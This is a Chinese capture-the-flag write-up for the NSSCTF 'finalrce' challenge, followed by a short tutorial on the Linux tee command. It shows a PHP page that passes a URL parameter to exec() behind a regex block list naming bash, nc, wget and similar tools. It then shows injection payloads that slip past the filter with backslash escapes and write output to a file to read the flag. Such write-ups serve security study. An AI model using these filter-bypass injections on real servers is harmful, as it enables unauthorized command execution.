### NSSCTF -[SWPUCTF 2021 新生赛]finalrce

---

题目如下，看了一下是无回显的形式

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
}
```

发现屏蔽了很多

```
http://node4.anna.nssctf.cn:28417/?url=l\s / |tee 1.txt
```



![image-20240909232627700](https://gitee.com/bx33661/image/raw/master/path/image-20240909232627700.png)

```
http://node4.anna.nssctf.cn:28417/?url=ta\c /flllll\aaaaaaggggggg |tee 2.txt
```

![image-20240909232603677](https://gitee.com/bx33661/image/raw/master/path/image-20240909232603677.png)



`tee`

> `tee` 是 Linux 中的一个命令，常用于将命令的输出**同时**发送到多个目标。它的基本功能是**读取标准输入**，然后将内容**写入标准输出**以及**一个或多个文件**。这样，你既可以在终端中查看输出，又能将输出保存到文件中。

基本语法

```bash
command | tee [OPTION]... [FILE]...
```

- `command`：要执行的命令
- `[OPTION]`：可选参数
- `[FILE]...`：输出要保存到的文件

常见选项

- `-a` (`--append`)：追加到文件的末尾，而不是覆盖文件。
- `-i` (`--ignore-interrupts`)：忽略中断信号。

示例

1. **将命令输出同时写入文件和屏幕**

   ```bash
   ls -l | tee output.txt
   ```

   这个命令会列出当前目录的文件，并将输出显示在屏幕上，同时保存到 `output.txt` 文件中。

2. **追加模式**

   ```bash
   ls -l | tee -a output.txt
   ```

   这会将 `ls -l` 的输出追加到 `output.txt`，而不会覆盖之前的内容。

3. **在管道中使用 tee**

   ```bash
   cat file.txt | tee output.txt | grep "pattern"
   ```

   这会将 `file.txt` 的内容输出到 `output.txt`，并继续将内容通过管道传递给 `grep` 命令进行匹配。

总结

`tee` 命令非常适合在不丢失输出内容的情况下，将数据保存到文件中。它在日志记录、调试、或处理复杂的管道时非常有用。